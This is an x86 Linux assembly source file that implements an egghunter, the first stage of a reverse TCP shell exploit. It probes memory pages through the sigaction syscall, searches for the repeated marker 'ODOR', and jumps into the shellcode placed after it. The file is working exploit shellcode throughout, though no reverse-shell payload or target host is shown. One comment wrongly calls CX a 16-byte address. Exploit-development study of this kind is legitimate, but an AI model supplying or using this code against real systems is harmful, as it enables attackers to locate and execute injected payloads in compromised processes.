; Name; Egghunting Linux x86 reverse shell TCP
; Filename: egghunt_rev_tcp_initial.asm
; Author hodorsec

global _start
section .text

_start:
	xor ecx, ecx	; clear ECX before being used by SCASD
	jmp short begin ; Jump to function

page:
	; Setup function calls and arguments for SIGACTION
	or cx, 0xfff	; OR the value of 0xfff and place it as a 16-byte address in CX, result 4095
    
loop:
	; Setup function calls and arguments for SIGACTION
	inc ecx		; Increment ECX by one, making it value 4096 as a Linux pagesize value
	push byte 0x43	; SYSCALL SIGACTION
	pop eax		; Calling SIGACTION in EAX
	int 0x80	; Execute SIGACTION

	; Check for returned error value
	cmp al, 0xf2	; 0xfffffff2 == -14 as value to be checked, seeing returned errors are negative
	jz page		; Jump to function for the next page, if EFAULT error is returned

	; Search for egghunter string
	mov eax, 0x524f444f	; Copy the string ‘ODOR’ for egghunting into EAX
	mov edi, ecx	; To be checked by SCASD, copy page address to EDI
	scasd		; Execute SCASD function to compare EAX to EDI
	jnz loop	; Jump to function to try the next address
	scasd		; Execute SCASD function again, this time for the remaining part of the eggstring
	jnz loop	; Jump to function to try the next address
	jmp edi		; Egg found, then jump to shellcode

begin:
	call loop	; Call loop

